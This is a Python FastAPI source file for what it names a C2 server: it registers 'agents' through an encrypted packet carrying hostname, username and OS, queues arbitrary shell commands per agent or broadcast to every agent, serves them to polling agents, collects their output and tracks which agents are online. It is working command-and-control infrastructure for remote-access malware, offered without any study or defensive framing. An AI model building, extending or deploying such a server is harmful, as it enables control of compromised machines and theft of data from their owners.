from fastapi import FastAPI, Request
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, String, Integer
from sqlalchemy.orm import sessionmaker, declarative_base
import time

from encryption.crypto import decrypt_message
from communication.protocol import parse_packet

app = FastAPI()

# DATABASE SETUP

engine = create_engine(
    "sqlite:///./c2server.db",
    connect_args={"check_same_thread": False}
)

SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

# DATABASE TABLES

class AgentDB(Base):
    __tablename__ = "agents"

    agent_id = Column(String, primary_key=True)
    hostname = Column(String)
    username = Column(String)
    os = Column(String)
    last_seen = Column(Integer)


class CommandDB(Base):
    __tablename__ = "commands"

    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(String)
    command = Column(String)


class OutputDB(Base):
    __tablename__ = "outputs"

    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(String)
    output = Column(String)


Base.metadata.create_all(engine)

# MODELS

class Agent(BaseModel):
    agent_id: str
    hostname: str
    username: str
    os: str
    status: str


class Command(BaseModel):
    agent_id: str
    command: str


class BroadcastCommand(BaseModel):
    command: str


class Output(BaseModel):
    agent_id: str
    output: str


class Heartbeat(BaseModel):
    agent_id: str


# HOME
@app.post("/register")
async def register(request: Request):

    try:
        body = await request.json()
        print("BODY RECEIVED:", body)

        payload = body.get("payload")

        if not payload:
            return {"error": "Missing payload"}

        decrypted = decrypt_message(payload)
        print("DECRYPTED:", decrypted)

        msg_type, data = parse_packet(decrypted)
        print("PARSED:", msg_type, data)

        # validate packet
        if not data:
            return {"error": "Invalid packet data"}

        agent_id = data.get("agent_id")
        hostname = data.get("hostname")
        username = data.get("username")
        os_name = data.get("os")

        if not agent_id:
            return {"error": "agent_id missing"}

    except Exception as e:
        print("REGISTER ERROR:", e)
        return {"error": str(e)}

    db = SessionLocal()

    try:
        existing = db.query(AgentDB).filter(
            AgentDB.agent_id == agent_id
        ).first()

        if not existing:

            new_agent = AgentDB(
                agent_id=agent_id,
                hostname=hostname,
                username=username,
                os=os_name,
                last_seen=int(time.time())
            )

            db.add(new_agent)
            db.commit()

    finally:
        db.close()

    return {"message": "agent registered"}
# HEARTBEAT

@app.post("/heartbeat")
async def heartbeat(hb: Heartbeat):

    db = SessionLocal()

    agent = db.query(AgentDB).filter(
        AgentDB.agent_id == hb.agent_id
    ).first()

    if agent:

        agent.last_seen = int(time.time())
        db.commit()

    db.close()

    return {"message": "heartbeat received"}


# SEND COMMAND

@app.post("/command")
async def send_command(cmd: Command):

    db = SessionLocal()

    new_command = CommandDB(
        agent_id=cmd.agent_id,
        command=cmd.command
    )

    db.add(new_command)
    db.commit()

    db.close()

    return {"message": "command stored"}


# BROADCAST COMMAND

@app.post("/broadcast")
async def broadcast(cmd: BroadcastCommand):

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    for agent in agents:

        new_command = CommandDB(
            agent_id=agent.agent_id,
            command=cmd.command
        )

        db.add(new_command)

    db.commit()
    db.close()

    return {"message": "command broadcast to all agents"}


# AGENT FETCH COMMAND

@app.get("/get_command/{agent_id}")
async def get_command(agent_id: str):

    db = SessionLocal()

    command = db.query(CommandDB).filter(
        CommandDB.agent_id == agent_id
    ).first()

    if command:

        cmd_text = command.command

        db.delete(command)
        db.commit()

        db.close()

        return {"command": cmd_text}

    db.close()

    return {"command": ""}


# RECEIVE OUTPUT

@app.post("/send_output")
async def receive_output(out: Output):

    db = SessionLocal()

    new_output = OutputDB(
        agent_id=out.agent_id,
        output=out.output
    )

    db.add(new_output)
    db.commit()

    db.close()

    return {"message": "output stored"}


# AGENT STATUS

@app.get("/status")
async def status():

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    current = int(time.time())

    result = {}

    for a in agents:

        if current - a.last_seen < 30:
            result[a.agent_id] = "online"
        else:
            result[a.agent_id] = "offline"

    db.close()

    return result


# VIEW OUTPUTS

@app.get("/outputs")
async def outputs():

    db = SessionLocal()

    data = db.query(OutputDB).all()

    results = []

    for d in data:

        results.append({
            "agent_id": d.agent_id,
            "output": d.output
        })

    db.close()

    return results


# DASHBOARD

@app.get("/dashboard")
async def dashboard():

    db = SessionLocal()

    agents = db.query(AgentDB).all()

    current = int(time.time())

    online = 0
    offline = 0

    for a in agents:

        if current - a.last_seen < 30:
            online += 1
        else:
            offline += 1

    db.close()

    return {
        "total_agents": len(agents),
        "online_agents": online,
        "offline_agents": offline
    }